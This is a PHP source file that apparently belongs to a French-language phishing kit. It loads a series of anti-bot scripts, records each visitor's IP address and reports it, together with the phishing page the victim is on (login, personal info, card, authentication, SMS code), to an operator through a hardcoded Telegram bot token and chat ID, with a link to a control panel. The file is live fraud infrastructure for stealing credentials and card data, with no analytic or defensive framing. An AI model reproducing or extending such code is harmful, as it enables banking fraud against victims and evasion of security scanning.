<?php
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
$ip = $_SERVER['REMOTE_ADDR'];
$page = basename($_SERVER['PHP_SELF'], '.php'); // auto-détection

$token = '7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4';
$chat_id = '8134069302';

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'];
$panel_link = $protocol . $host . '/panel.php';

$messages = [
    'connexion' => "🔐 L'utilisateur est sur *connexion.php*",
    'info' => "📄 L'utilisateur est sur *info.php*",
    'carte' => "💳 L'utilisateur est sur *carte.php*",
    'authentification' => "🔒 L'utilisateur est sur *authentification.php*",
    'loading' => "⏳ L'utilisateur est sur *loading.php* et attend une redirection",
    'sms' => "⏳ L'utilisateur est sur *sms.php*"
];

$header = $messages[$page] ?? "👀 Un utilisateur navigue sur une page inconnue";

$text = <<<EOT
$header

🌐 IP : `$ip`

🔗 Lien vers le panel :
`$panel_link`

👉 [Ouvrir le panel]($panel_link)
EOT;

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text' => $text,
    'parse_mode' => 'Markdown',
    'disable_web_page_preview' => true
]));
